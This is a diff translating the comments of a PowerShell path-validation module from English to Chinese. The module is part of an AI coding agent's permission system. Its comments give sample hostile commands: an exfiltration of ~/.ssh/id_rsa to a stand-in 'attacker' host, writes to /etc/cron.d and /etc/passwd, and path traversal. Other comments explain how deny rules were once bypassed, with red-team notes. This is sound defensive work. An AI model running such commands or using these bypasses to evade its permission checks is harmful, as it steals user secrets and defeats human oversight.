@@ -1,9 +1,9 @@
 /**
- * PowerShell-specific path validation for command arguments.
+ * PowerShell 命令参数专用的路径校验。
  *
- * Extracts file paths from PowerShell commands using the AST parser
- * and validates they stay within allowed project directories.
- * Follows the same patterns as BashTool/pathValidation.ts.
+ * 使用 AST 解析器从 PowerShell 命令中提取文件路径，
+ * 并校验它们是否保持在允许的项目目录范围内。
+ * 遵循与 BashTool/pathValidation.ts 相同的模式。
  */
 
 import { homedir } from 'os'
@@ -44,9 +44,9 @@ import { COMMON_SWITCHES, COMMON_VALUE_PARAMS } from './commonParameters.js'
 import { resolveToCanonical } from './readOnlyValidation.js'
 
 const MAX_DIRS_TO_LIST = 5
-// PowerShell wildcards are only * ? [ ] — braces are LITERAL characters
-// (no brace expansion). Including {} mis-routed paths like `./{x}/passwd`
-// through glob-base truncation instead of full-path symlink resolution.
+// PowerShell 通配符只有 * ? [ ] — 花括号是【字面】字符
+// （没有花括号展开）。包含 {} 会把诸如 `./{x}/passwd` 的路径
+// 错误地按 glob-base 截断处理，而不是进行完整路径的符号链接解析。
 const GLOB_PATTERN_REGEX = /[*?[\]]/
 
 type FileOperationType = 'read' | 'write' | 'create'
@@ -61,73 +61,72 @@ type ResolvedPathCheckResult = PathCheckResult & {
 }
 
 /**
- * Per-cmdlet parameter configuration.
+ * 每个 cmdlet 的参数配置。
  *
- * Each entry declares:
- *   - operationType: whether this cmdlet reads or writes to the filesystem
- *   - pathParams: parameters that accept file paths (validated against allowed directories)
- *   - knownSwitches: switch parameters (take NO value) — next arg is NOT consumed
- *   - knownValueParams: value-taking parameters that are NOT paths — next arg IS consumed
- *     but NOT validated as a path (e.g., -Encoding UTF8, -Filter *.txt)
+ * 每个条目声明：
+ *   - operationType: 该 cmdlet 是读取还是写入文件系统
+ *   - pathParams: 接受文件路径的参数（针对允许的目录进行校验）
+ *   - knownSwitches: 开关参数（不取值）——下一个参数【不会】被当作值消费
+ *   - knownValueParams: 需要取值但不是路径的参数——下一个参数【会】被消费，
+ *    但【不会】作为路径校验（例如 -Encoding UTF8、-Filter *.txt）
  *
- * SECURITY MODEL: Any -Param NOT in one of these three sets forces
- * hasUnvalidatablePathArg → ask. This ends the KNOWN_SWITCH_PARAMS whack-a-mole
- * where every missing switch caused the unknown-param heuristic to swallow the
- * next arg (potentially the positional path). Now, Tier 2 cmdlets only auto-allow
- * with invocations we fully understand.
+ * 安全模型：任何【不在】上述三类之内的 -Param 都会触发
+ * hasUnvalidatablePathArg → ask。这终结了 KNOWN_SWITCH_PARAMS 的
+ * “打地鼠”问题——以前每个缺失的开关都会让未知参数启发式逻辑吞掉
+ * 下一个参数（可能正是位置路径）。现在第 2 层 cmdlet 仅在调用方式
+ * 完全可理解时才会自动放行。
  *
- * Sources:
- *   - (Get-Command <cmdlet>).Parameters on Windows PowerShell 5.1
- *   - PS 6+ additions from official docs (e.g., -AsByteStream, -NoEmphasis)
+ * 来源：
+ *   - Windows PowerShell 5.1 的 (Get-Command <cmdlet>).Parameters
+ *   - 官方文档中 PS 6+ 新增项（例如 -AsByteStream、-NoEmphasis）
  *
- * NOTE: Common parameters (-Verbose, -ErrorAction, etc.) are NOT listed here;
- * they are merged in from COMMON_SWITCHES / COMMON_VALUE_PARAMS at lookup time.
+ * 注意：公共参数（-Verbose、-ErrorAction 等）不在此列出；
+ * 它们会在查找时由 COMMON_SWITCHES / COMMON_VALUE_PARAMS 并入。
  *
- * Parameter names are lowercase with leading dash to match runtime comparison.
+ * 参数名使用带前导破折号的小写形式，以匹配运行时比较。
  */
 type CmdletPathConfig = {
   operationType: FileOperationType
-  /** Parameter names that accept file paths (validated against allowed directories) */
+  /** 接受文件路径的参数名（针对允许的目录进行校验） */
   pathParams: string[]
-  /** Switch parameters that take no value (next arg is NOT consumed) */
+  /** 不取值的开关参数（下一个参数【不会】被消费） */
   knownSwitches: string[]
-  /** Value-taking parameters that are not paths (next arg IS consumed, not path-validated) */
+  /** 需要取值但不是路径的参数（下一个参数【会】被消费，但不做路径校验） */
   knownValueParams: string[]
   /**
-   * Parameter names that accept a leaf filename resolved by PowerShell
-   * relative to ANOTHER parameter (not cwd). Safe to extract only when the
-   * value is a simple leaf (no `/`, `\`, `.`, `..`). Non-leaf values are
-   * flagged as unvalidatable because validatePath resolves against cwd, not
-   * the actual base — joining against -Path would need cross-parameter
-   * tracking.
+   * 接受“叶子文件名”的参数名——该文件由 PowerShell 相对【另一个】参数
+   * （而非 cwd）解析。只有当值为简单叶子（不含 `/`、`\`、`.`、`..`）时
+   * 才安全地提取。非叶子值会被标记为无法校验，因为 validatePath 是相对
+   * cwd 解析的，而不是相对实际基准目录——若要与 -Path 拼接则需要跨参数
+   * 追踪。
    */
   leafOnlyPathParams?: string[]
   /**
-   * Number of leading positional arguments to skip (NOT extracted as paths).
-   * Used for cmdlets where positional-0 is a non-path value — e.g.,
-   * Invoke-WebRequest's positional -Uri is a URL, not a local filesystem path.
-   * Without this, `iwr http://example.com` extracts `http://example.com` as
-   * a path, and validatePath's provider-path regex (^[a-z]{2,}:) misfires on
-   * the URL scheme with a confusing "non-filesystem provider" message.
+   * 需要跳过的前导位置参数数量（不会作为路径提取）。
+   * 用于位置-0 是非路径值的 cmdlet，例如 Invoke-WebRequest 的位置参数
+   * -Uri 是 URL，而非本地文件系统路径。若没有此设置，`iwr http://example.com`
+   * 会把 `http://example.com` 当作路径提取，而 validatePath 的 provider 路径
+   * 正则（^[a-z]{2,}:）会误判 URL scheme，产生令人困惑的
+   * “非文件系统 provider”错误信息。
    */
   positionalSkip?: number
   /**
-   * When true, this cmdlet only writes to disk when a pathParam is present.
-   * Without a path (e.g., `Invoke-WebRequest https://example.com` with no
-   * -OutFile), it's effectively a read operation — output goes to the pipeline,
-   * not the filesystem. Skips the "write with no target path" forced-ask.
-   * Cmdlets like Set-Content that ALWAYS write should NOT set this.
+   * 为 true 时，该 cmdlet 仅当存在 pathParam 时才写入磁盘。
+   * 没有路径时（例如不带 -OutFile 的 `Invoke-WebRequest https://example.com`），
+   * 它实际上是读取操作——输出进入管道，不会写入文件系统。
+   * 跳过“写操作但没有目标路径”的强制 ask。
+   * 像 Set-Content 这样【永远】执行的写 cmdlet 不应设置此项。
    */
   optionalWrite?: boolean
 }
 
 const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
-  // ─── Write/create operations ──────────────────────────────────────────────
+  // ─── 写入/创建操作 ────────────────────────────────────────────────────
   'set-content': {
     operationType: 'write',
-    // -PSPath and -LP are runtime aliases for -LiteralPath on all provider
-    // cmdlets. Without them, colon syntax (-PSPath:/etc/x) falls to the
-    // unknown-param branch → path trapped → paths=[] → deny never consulted.
+    // -PSPath 和 -LP 是所有 provider cmdlet 上 -LiteralPath 的运行时别名。
+    // 没有它们，冒号语法（-PSPath:/etc/x）会落入未知参数分支 →
+    // 路径被截获 → paths=[] → deny 规则不再被检查。
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: [
       '-passthru',
@@ -200,16 +199,15 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-stream',
     ],
   },
-  // Out-File/Tee-Object/Export-Csv/Export-Clixml were absent, so path-level
-  // deny rules (Edit(/etc/**)) hard-blocked `Set-Content /etc/x` but only
-  // *asked* for `Out-File /etc/x`. All four are write cmdlets that accept
-  // file paths positionally.
+  // 之前缺失 Out-File/Tee-Object/Export-Csv/Export-Clixml，导致路径级
+  // deny 规则（Edit(/etc/**)）能硬拦截 `Set-Content /etc/x`，但对
+  // `Out-File /etc/x` 却只是【询问】。这四个都是接收位置文件路径的写 cmdlet。
   'out-file': {
     operationType: 'write',
-    // Out-File uses -FilePath (position 0). -Path is PowerShell's documented
-    // ALIAS for -FilePath — must be in pathParams or `Out-File -Path:./x`
-    // (colon syntax, one token) falls to unknown-param → value trapped →
-    // paths=[] → Edit deny never consulted → ask (fail-safe but deny downgrade).
+    // Out-File 使用 -FilePath（位置 0）。-Path 是 -FilePath 在 PowerShell
+    // 文档中记录的【别名】——必须放在 pathParams 中，否则 `Out-File -Path:./x`
+    // （冒号语法、单个 token）会落入未知参数 → 值被截获 → paths=[] →
+    // Edit deny 不再被检查 → ask（安全兜底，但把 deny 降级为 ask）。
     pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: [
       '-append',
@@ -223,7 +221,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'tee-object': {
     operationType: 'write',
-    // Tee-Object uses -FilePath (position 0, alias: -Path). -Variable NOT a path.
+    // Tee-Object 使用 -FilePath（位置 0，别名：-Path）。-Variable 不是路径。
     pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: ['-append'],
     knownValueParams: ['-inputobject', '-variable', '-encoding'],
@@ -256,31 +254,28 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
     knownSwitches: ['-force', '-noclobber', '-whatif', '-confirm'],
     knownValueParams: ['-inputobject', '-depth', '-encoding'],
   },
-  // New-Item/Copy-Item/Move-Item were missing: `mkdir /etc/cron.d/evil` →
-  // resolveToCanonical('mkdir') = 'new-item' via COMMON_ALIASES → not in
-  // config → early return {paths:[], 'read'} → Edit deny never consulted.
+  // 之前缺失 New-Item/Copy-Item/Move-Item：`mkdir /etc/cron.d/evil` →
+  // resolveToCanonical('mkdir') = 'new-item'（通过 COMMON_ALIASES）→ 不在
+  // 配置中 → 提前返回 {paths:[], 'read'} → Edit deny 不再被检查。
   //
-  // Copy-Item/Move-Item have DUAL path params (-Path source, -Destination
-  // dest). operationType:'write' is imperfect — source is semantically a read
-  // — but it means BOTH paths get Edit-deny validation, which is strictly
-  // safer than extracting neither. A per-param operationType would be ideal
-  // but that's a bigger schema change; blunt 'write' closes the gap now.
+  // Copy-Item/Move-Item 具有【两个】路径参数（-Path 源，-Destination 目标）。
+  // operationType:'write' 并不完美——源在语义上是读取——但这样两个路径都会
+  // 得到 Edit-deny 校验，这严格优于一个都不提取。理想的方案是为每个参数
+  // 单独设置 operationType，但那会改动更大的 schema；目前用一刀切的 'write'
+  // 已经弥合了这个缺口。
   'new-item': {
     operationType: 'write',
-    // -Path is position 0. -Name (position 1) is resolved by PowerShell
-    // RELATIVE TO -Path (per MS docs: "you can specify the path of the new
-    // item in Name"), including `..` traversal. We resolve against CWD
-    // (validatePath L930), not -Path — so `New-Item -Path /allowed
-    // -Name ../secret/evil` creates /allowed/../secret/evil = /secret/evil,
-    // but we resolve cwd/../secret/evil which lands ELSEWHERE and can miss
-    // the deny rule. This is a deny→ask downgrade, not fail-safe.
+    // -Path 是位置 0。-Name（位置 1）由 PowerShell 相对 -Path 解析
+    // （根据 MS 文档：“可以在 Name 中指定新项的路径”），支持 `..` 穿越。
+    // 我们相对 CWD 解析（validatePath L930），而不是相对 -Path ——因此
+    // `New-Item -Path /allowed -Name ../secret/evil` 会创建
+    // /allowed/../secret/evil = /secret/evil，但我们解析的是 cwd/../secret/evil，
+    // 落到了【别处】，可能漏掉 deny 规则。这是 deny→ask 的降级，而非安全兜底。
     //
-    // -name is in leafOnlyPathParams: simple leaf filenames (`foo.txt`) are
-    // extracted (resolves to cwd/foo.txt — slightly wrong, but -Path
-    // extraction covers the directory, and a leaf can't traverse);
-    // any value with `/`, `\`, `.`, `..` flags hasUnvalidatablePathArg →
-    // ask. Joining -Name against -Path would be correct but needs
-    // cross-parameter tracking — out of scope here.
+    // -name 位于 leafOnlyPathParams：简单叶子文件名（`foo.txt`）会被提取
+    // （解析为 cwd/foo.txt——略有偏差，但 -Path 提取已覆盖目录，且叶子
+    // 无法穿越）；任何含 `/`、`\`、`.`、`..` 的值会触发 hasUnvalidatablePathArg →
+    // ask。将 -Name 与 -Path 拼接才正确，但需要跨参数追踪——此处超出范围。
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
     leafOnlyPathParams: ['-name'],
     knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
@@ -288,8 +283,8 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'copy-item': {
     operationType: 'write',
-    // -Path (position 0) is source, -Destination (position 1) is dest.
-    // Both extracted; both validated as write.
+    // -Path（位置 0）是源，-Destination（位置 1）是目标。
+    // 两者都会被提取；都按写入校验。
     pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
     knownSwitches: [
       '-container',
@@ -321,17 +316,16 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
     ],
     knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
   },
-  // rename-item/set-item: same class — ren/rni/si in COMMON_ALIASES, neither
-  // was in config. `ren /etc/passwd passwd.bak` → resolves to rename-item
-  // → not in config → {paths:[], 'read'} → Edit deny bypassed. This closes
-  // the COMMON_ALIASES→CMDLET_PATH_CONFIG coverage audit: every
-  // write-cmdlet alias now resolves to a config entry.
+  // rename-item/set-item：同类——ren/rni/si 在 COMMON_ALIASES 中，也都
+  // 不在配置里。`ren /etc/passwd passwd.bak` → 解析为 rename-item →
+  // 不在配置 → {paths:[], 'read'} → Edit deny 被绕过。此条目封堵了
+  // COMMON_ALIASES→CMDLET_PATH_CONFIG 覆盖审计：每个写 cmdlet 别名
+  // 现在都会解析到某个配置条目。
   'rename-item': {
     operationType: 'write',
-    // -Path position 0, -NewName position 1. -NewName is leaf-only (docs:
-    // "You cannot specify a new drive or a different path") and Rename-Item
-    // explicitly rejects `..` in it — so knownValueParams is correct here,
-    // unlike New-Item -Name which accepts traversal.
+    // -Path 位置 0，-NewName 位置 1。-NewName 只接受叶子（文档：“无法指定
+    // 新驱动器或不同的路径”），且 Rename-Item 会显式拒绝其中的 `..`——
+    // 因此这里用 knownValueParams 是对的，与接受穿越的 New-Item -Name 不同。
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: [
       '-force',
@@ -350,12 +344,12 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'set-item': {
     operationType: 'write',
-    // FileSystem provider throws NotSupportedException for Set-Item content,
-    // so the practical write surface is registry/env/function/alias providers.
-    // Provider-qualified paths (HKLM:\\, Env:\\) are independently caught at
-    // step 3.5 in powershellPermissions.ts, but classifying set-item as write
-    // here is defense-in-depth — powershellSecurity.ts:379 already lists it
-    // in ENV_WRITE_CMDLETS; this makes pathValidation consistent.
+    // FileSystem provider 对 Set-Item 内容会抛出 NotSupportedException，
+    // 因此实际的写入面是 registry/env/function/alias 等 provider。
+    // 带 provider 限定的路径（HKLM:\\、Env:\\) 在 powershellPermissions.ts
+    // 的第 3.5 步会被单独捕获，但这里将 set-item 归类为 write 属于纵深防御——
+    // powershellSecurity.ts:379 已把它列入 ENV_WRITE_CMDLETS；这使
+    // pathValidation 保持一致。
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: [
       '-force',
@@ -372,7 +366,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-exclude',
     ],
   },
-  // ─── Read operations ──────────────────────────────────────────────────────
+  // ─── 读取操作 ────────────────────────────────────────────────────────
   'get-content': {
     operationType: 'read',
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
@@ -545,8 +539,8 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'pop-location': {
     operationType: 'read',
-    // Pop-Location has no -Path/-LiteralPath (it pops from the stack),
-    // but we keep the entry so it passes through path validation gracefully.
+    // Pop-Location 没有 -Path/-LiteralPath（它是从栈中弹出），
+    // 但我们保留此条目，以便它能优雅地通过路径校验。
     pathParams: [],
     knownSwitches: ['-passthru', '-usetransaction'],
     knownValueParams: ['-stackname'],
@@ -559,7 +553,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'get-winevent': {
     operationType: 'read',
-    // Get-WinEvent only has -Path, no -LiteralPath
+    // Get-WinEvent 只有 -Path，没有 -LiteralPath
     pathParams: ['-path'],
     knownSwitches: ['-force', '-oldest'],
     knownValueParams: [
@@ -575,20 +569,19 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-filterhashtable',
     ],
   },
-  // Write-path cmdlets with output parameters. Without these entries,
-  // -OutFile / -DestinationPath would write to arbitrary paths unvalidated.
+  // 带输出参数的写路径 cmdlet。若没有这些条目，-OutFile / -DestinationPath
+  // 会在未校验的情况下写入任意路径。
   'invoke-webrequest': {
     operationType: 'write',
-    // -OutFile is the write target; -InFile is a read source (uploads a local
-    // file). Both are in pathParams so Edit deny rules are consulted (this
-    // config is operationType:write → permissionType:edit). A user with
-    // Edit(~/.ssh/**) deny blocks `iwr https://attacker -Method POST
-    // -InFile ~/.ssh/id_rsa` exfil. Read-only deny rules are not consulted
-    // for write-type cmdlets — that's a known limitation of the
-    // operationType→permissionType mapping.
+    // -OutFile 是写入目标；-InFile 是读取源（上传本地文件）。两者都在
+    // pathParams 中，因此 Edit deny 规则会被检查（此配置是
+    // operationType:write → permissionType:edit）。拥有 Edit(~/.ssh/**) deny
+    // 规则的用户会阻止 `iwr https://attacker -Method POST -InFile ~/.ssh/id_rsa`
+    // 的数据外泄。只读 deny 规则不会被写类型 cmdlet 检查——这是已知的
+    // operationType→permissionType 映射局限。
     pathParams: ['-outfile', '-infile'],
-    positionalSkip: 1, // positional-0 is -Uri (URL), not a filesystem path
-    optionalWrite: true, // only writes with -OutFile; bare iwr is pipeline-only
+    positionalSkip: 1, // 位置-0 是 -Uri（URL），不是文件系统路径
+    optionalWrite: true, // 仅在有 -OutFile 时才写；裸露的 iwr 只是管道
     knownSwitches: [
       '-allowinsecureredirect',
       '-allowunencryptedauthentication',
@@ -630,11 +623,11 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'invoke-restmethod': {
     operationType: 'write',
-    // -OutFile is the write target; -InFile is a read source (uploads a local
-    // file). Both must be in pathParams so deny rules are consulted.
+    // -OutFile 是写入目标；-InFile 是读取源（上传本地文件）。
+    // 两者都必须放在 pathParams 中，以便 deny 规则被检查。
     pathParams: ['-outfile', '-infile'],
-    positionalSkip: 1, // positional-0 is -Uri (URL), not a filesystem path
-    optionalWrite: true, // only writes with -OutFile; bare irm is pipeline-only
+    positionalSkip: 1, // 位置-0 是 -Uri（URL），不是文件系统路径
+    optionalWrite: true, // 仅在有 -OutFile 时才写；裸露的 irm 只是管道
     knownSwitches: [
       '-allowinsecureredirect',
       '-allowunencryptedauthentication',
@@ -690,11 +683,10 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
     knownSwitches: ['-force', '-update', '-passthru', '-whatif', '-confirm'],
     knownValueParams: ['-compressionlevel'],
   },
-  // *-ItemProperty cmdlets: primary use is the Registry provider (set/new/
-  // remove a registry VALUE under a key). Provider-qualified paths (HKLM:\,
-  // HKCU:\) are independently caught at step 3.5 in powershellPermissions.ts.
-  // Entries here are defense-in-depth for Edit-deny-rule consultation, mirroring
-  // set-item's rationale.
+  // *-ItemProperty 类 cmdlet：主要用途是 Registry provider（在一个键下
+  // 设置/新建/删除注册表【值】）。带 provider 限定的路径（HKLM:\、HKCU:\）
+  // 会在 powershellPermissions.ts 的第 3.5 步被单独捕获。此处的条目属于
+  // 纵深防御，用于让 Edit-deny 规则得到检查，与 set-item 的理由一致。
   'set-itemproperty': {
     operationType: 'write',
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
@@ -765,9 +757,8 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
 }
 
 /**
- * Checks if a lowercase parameter name (with leading dash) matches any entry
- * in the given param list, accounting for PowerShell's prefix-matching behavior
- * (e.g., -Lit matches -LiteralPath).
+ * 检查带前导破折号的小写参数名是否匹配给定参数列表中的任何条目，
+ * 考虑到 PowerShell 的前缀匹配行为（例如 -Lit 匹配 -LiteralPath）。
  */
 function matchesParam(paramLower: string, paramList: string[]): boolean {
   for (const p of paramList) {
@@ -782,13 +773,12 @@ function matchesParam(paramLower: string, paramList: string[]): boolean {
 }
 
 /**
- * Returns true if a colon-syntax value contains expression constructs that
- * mask the real runtime path (arrays, subexpressions, variables, backtick
- * escapes). The outer CommandParameterAst 'Parameter' element type hides
- * these from our AST walk, so we must detect them textually.
+ * 如果冒号语法值包含会掩盖真实运行时路径的表达式结构（数组、子表达式、
+ * 变量、反引号转义），则返回 true。外层 CommandParameterAst 的 'Parameter'
+ * 元素类型会把这些隐藏在我们的 AST 遍历之外，因此必须用文本方式检测。
  *
- * Used in three branches of extractPathsFromCommand: pathParams,
- * leafOnlyPathParams, and the unknown-param defense-in-depth branch.
+ * 用于 extractPathsFromCommand 的三个分支：pathParams、
+ * leafOnlyPathParams 以及未知参数纵深防御分支。
  */
 function hasComplexColonValue(rawValue: string): boolean {
   return (
@@ -811,11 +801,11 @@ function formatDirectoryList(directories: string[]): string {
     .slice(0, MAX_DIRS_TO_LIST)
     .map(dir => `'${dir}'`)
     .join(', ')
-  return `${firstDirs}, and ${dirCount - MAX_DIRS_TO_LIST} more`
+  return `${firstDirs}，以及另外 ${dirCount - MAX_DIRS_TO_LIST} 个`
 }
 
 /**
- * Expands tilde (~) at the start of a path to the user's home directory.
+ * 将路径开头的波浪号（~）展开为用户的主目录。
  */
 function expandTilde(filePath: string): string {
   if (
@@ -829,13 +819,12 @@ function expandTilde(filePath: string): string {
 }
 
 /**
- * Checks the raw user-provided path (pre-realpath) for dangerous removal
- * targets. safeResolvePath/realpathSync canonicalizes in ways that defeat
- * isDangerousRemovalPath: on Windows '/' → 'C:\' (fails the === '/' check);
- * on macOS homedir() may be under /var which realpathSync rewrites to
- * /private/var (fails the === homedir() check). Checking the tilde-expanded,
- * backslash-normalized form catches the dangerous shapes (/, ~, /etc, /usr)
- * as the user typed them.
+ * 检查用户提供的原始路径（realpath 之前）是否为危险的删除目标。
+ * safeResolvePath/realpathSync 会以某些方式规范化路径，从而绕过
+ * isDangerousRemovalPath：在 Windows 上 '/' → 'C:\'（无法通过 === '/' 判断）；
+ * 在 macOS 上 homedir() 可能位于 /var 之下，realpathSync 会改写为
+ * /private/var（无法通过 === homedir() 判断）。对波浪号展开、反斜杠
+ * 归一化后的形式进行检查，能捕捉到用户输入时的危险形态（/、~、/etc、/usr）。
  */
 export function isDangerousRemovalRawPath(filePath: string): boolean {
   const expanded = expandTilde(filePath.replace(/^['"]|['"]$/g, '')).replace(
@@ -848,17 +837,17 @@ export function isDangerousRemovalRawPath(filePath: string): boolean {
 export function dangerousRemovalDeny(path: string): PermissionResult {
   return {
     behavior: 'deny',
-    message: `Remove-Item on system path '${path}' is blocked. This path is protected from removal.`,
+    message: `对系统路径 '${path}' 执行 Remove-Item 已被阻止。此路径受删除保护。`,
     decisionReason: {
       type: 'other',
-      reason: 'Removal targets a protected system path',
+      reason: '删除目标是一个受保护的系统路径',
     },
   }
 }
 
 /**
- * Checks if a resolved path is allowed for the given operation type.
- * Mirrors the logic in BashTool/pathValidation.ts isPathAllowed.
+ * 检查解析后的路径是否允许用于给定的操作类型。
+ * 沿用 BashTool/pathValidation.ts 中 isPathAllowed 的逻辑。
  */
 function isPathAllowed(
   resolvedPath: string,
@@ -868,7 +857,7 @@ function isPathAllowed(
 ): PathCheckResult {
   const permissionType = operationType === 'read' ? 'read' : 'edit'
 
-  // 1. Check deny rules first
+  // 1. 先检查 deny 规则
   const denyRule = matchingRuleForInput(
     resolvedPath,
     context,
@@ -882,10 +871,10 @@ function isPathAllowed(
     }
   }
 
-  // 2. For write/create operations, check internal editable paths (plan files, scratchpad, agent memory, job dirs)
-  // This MUST come before checkPathSafetyForAutoEdit since .limkenion is a dangerous directory
-  // and internal editable paths live under ~/.limkenion/ — matching the ordering in
-  // checkWritePermissionForTool (filesystem.ts step 1.5)
+  // 2. 对于写/创建操作，检查内部可编辑路径（计划文件、草稿本、agent 记忆、任务目录）
+  // 此步骤必须在 checkPathSafetyForAutoEdit 之前，因为 .limkenion 是危险目录，
+  // 内部可编辑路径位于 ~/.limkenion/ 下——与
+  // checkWritePermissionForTool（filesystem.ts 第 1.5 步）中的顺序保持一致
   if (operationType !== 'read') {
     const internalEditResult = checkEditableInternalPath(resolvedPath, {})
     if (internalEditResult.behavior === 'allow') {
@@ -896,7 +885,7 @@ function isPathAllowed(
     }
   }
 
-  // 2.5. For write/create operations, check safety validations
+  // 2.5. 对于写/创建操作，检查安全性校验
   if (operationType !== 'read') {
     const safetyCheck = checkPathSafetyForAutoEdit(
       resolvedPath,
@@ -914,7 +903,7 @@ function isPathAllowed(
     }
   }
 
-  // 3. Check if path is in allowed working directory
+  // 3. 检查路径是否在允许的工作目录内
   const isInWorkingDir = pathInAllowedWorkingPath(
     resolvedPath,
     context,
@@ -926,7 +915,7 @@ function isPathAllowed(
     }
   }
 
-  // 3.5. For read operations, check internal readable paths
+  // 3.5. 对于读取操作，检查内部可读路径
   if (operationType === 'read') {
     const internalReadResult = checkReadableInternalPath(resolvedPath, {})
     if (internalReadResult.behavior === 'allow') {
@@ -937,13 +926,11 @@ function isPathAllowed(
     }
   }
 
-  // 3.7. For write/create operations to paths OUTSIDE the working directory,
-  // check the sandbox write allowlist. When the sandbox is enabled, users
-  // have explicitly configured writable directories (e.g. /tmp/limkenion/) —
-  // treat these as additional allowed write directories so redirects/Out-File/
-  // New-Item don't prompt unnecessarily. Paths IN the working directory are
-  // excluded: the sandbox allowlist always seeds '.' (cwd), which would
-  // bypass the acceptEdits gate at step 3.
+  // 3.7. 对于指向工作目录【之外】的写/创建操作，检查沙箱写入白名单。
+  // 当沙箱启用时，用户显式配置了可写目录（例如 /tmp/limkenion/）——
+  // 将其视为额外允许的写入目录，这样重定向/Out-File/New-Item 不会无故
+  // 弹出提示。位于工作目录【内】的路径被排除：沙箱白名单始终以 '.'
+  //（cwd）作为种子，否则会绕过第 3 步的 acceptEdits 门槛。
   if (
     operationType !== 'read' &&
     !isInWorkingDir &&
@@ -953,12 +940,12 @@ function isPathAllowed(
       allowed: true,
       decisionReason: {
         type: 'other',
-        reason: 'Path is in sandbox write allowlist',
+        reason: '路径位于沙箱写入白名单中',
       },
     }
   }
 
-  // 4. Check allow rules
+  // 4. 检查 allow 规则
   const allowRule = matchingRuleForInput(
     resolvedPath,
     context,
@@ -972,14 +959,14 @@ function isPathAllowed(
     }
   }
 
-  // 5. Path is not allowed
+  // 5. 路径不允许
   return { allowed: false }
 }
 
 /**
- * Best-effort deny check for paths obscured by :: or backtick syntax.
- * ONLY checks deny rules — never auto-allows. If the stripped guess
- * doesn't match a deny rule, we fall through to ask as before.
+ * 对被 :: 或反引号语法掩盖的路径做最佳努力的 deny 检查。
+ * 只检查 deny 规则——绝不自动放行。如果剥离后的猜测不匹配任何 deny
+ * 规则，则照旧回退到 ask。
  */
 function checkDenyRuleForGuessedPath(
   strippedPath: string,
@@ -987,11 +974,11 @@ function checkDenyRuleForGuessedPath(
   toolPermissionContext: ToolPermissionContext,
   operationType: FileOperationType,
 ): { resolvedPath: string; rule: PermissionRule } | null {
-  // Red-team P7: null bytes make expandPath throw. Pre-existing but
-  // defend here since we're introducing a new call path.
+  // 红队 P7：空字节会让 expandPath throw。虽是既有问题，但既然这里
+  // 引入了新的调用路径，就一并在此防御。
   if (!strippedPath || strippedPath.includes('\0')) return null
-  // Red-team P3: `~/.ssh/x strips to ~/.ssh/x but expandTilde only fires
-  // on leading ~ — the backtick was in front of it. Re-run here.
+  // 红队 P3：`~/.ssh/x 剥离后是 ~/.ssh/x，但 expandTilde 只对前导 ~ 生效
+  // ——反引号在其前面。这里重新执行。
   const tildeExpanded = expandTilde(strippedPath)
   const abs = isAbsolute(tildeExpanded)
     ? tildeExpanded
@@ -1008,7 +995,7 @@ function checkDenyRuleForGuessedPath(
 }
 
 /**
- * Validates a file system path, handling tilde expansion.
+ * 校验一个文件系统路径，处理波浪号展开。
  */
 function validatePath(
   filePath: string,
@@ -1016,25 +1003,23 @@ function validatePath(
   toolPermissionContext: ToolPermissionContext,
   operationType: FileOperationType,
 ): ResolvedPathCheckResult {
-  // Remove surrounding quotes if present
+  // 去掉可能存在的首尾引号
   const cleanPath = expandTilde(filePath.replace(/^['"]|['"]$/g, ''))
 
-  // SECURITY: PowerShell Core normalizes backslashes to forward slashes on all
-  // platforms, but path.resolve on Linux/Mac treats them as literal characters.
-  // Normalize before resolution so traversal patterns like dir\..\..\etc\shadow
-  // are correctly detected.
+  // 安全：PowerShell Core 在所有平台上都会把反斜杠归一化为正斜杠，
+  // 但 Linux/Mac 上的 path.resolve 会把它们当作字面字符处理。
+  // 在解析前归一化，这样 dir\..\..\etc\shadow 之类的穿越模式能被正确检测。
   const normalizedPath = cleanPath.replace(/\\/g, '/')
 
-  // SECURITY: Backtick (`) is PowerShell's escape character. It is a no-op in
-  // many positions (e.g., `/ === /) but defeats Node.js path checks like
-  // isAbsolute(). Redirection targets use raw .Extent.Text which preserves
-  // backtick escapes. Treat any path containing a backtick as unvalidatable.
+  // 安全：反引号（`）是 PowerShell 的转义字符。它在许多位置是空操作
+  // （例如 `/ === /），但却能骗过 Node.js 的路径检测，比如 isAbsolute()。
+  // 重定向目标使用原始的 .Extent.Text，它保留了反引号转义。
+  // 将任何含有反引号的路径视为无法校验。
   if (normalizedPath.includes('`')) {
-    // Red-team P3: backtick is already resolved for StringConstant args
-    // (parser uses .value); this guard primarily fires for redirection
-    // targets which use raw .Extent.Text. Strip is a no-op for most special
-    // escapes (`n → n) but that's fine — wrong guess → no deny match →
-    // falls to ask.
+    // 红队 P3：对于 StringConstant 参数，反引号已被解析
+    //（解析器使用 .value）；此守卫主要针对使用原始 .Extent.Text 的
